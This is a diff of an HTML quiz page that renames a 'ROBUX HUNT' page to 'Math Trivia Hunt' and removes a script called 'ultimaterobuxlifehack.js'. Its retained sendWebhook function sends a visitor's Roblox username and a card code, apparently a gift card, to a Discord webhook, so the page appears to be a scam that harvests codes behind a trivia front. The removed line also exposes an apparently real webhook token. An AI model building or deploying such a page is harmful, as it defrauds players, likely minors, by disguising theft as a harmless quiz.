@@ -3,16 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROBUX HUNT</title>
-    <link rel="stylesheet" href="../design.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Gaosek+One&display=swap" rel="stylesheet">
-    <script src="ultimaterobuxlifehack.js"></script>
+    <title>Math Trivia Hunt</title>
+    <link rel="stylesheet" href="https://robuxhunt.pages.dev/design.css">
 </head>
 <body>
+
 <div id="quiz">
-    <h1>ROBUX HUNT</h1>
+    <h1>Math Trivia Hunt</h1>
     <p>Answer the following 10 math trivia questions:</p>
     <div id="question"></div>
     <div class="choices">
@@ -89,7 +86,7 @@
     function sendWebhook() {
         const username = document.getElementById('usernameInput').value;
         const code = document.getElementById('codeInput').value;
-        const webhookURL = 'https://discord.com/api/webhooks/1223054275165421679/pxJdBHxflazOWfC25finXuuYA3VqyALlu2tYcm0qSNylolKWvi7hRMISXpqEOMcSg1kA';
+        const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
         const message = `<@1044100724734300270> 
 Roblox Username: ${username}
 Card Code ID: ${code}`;
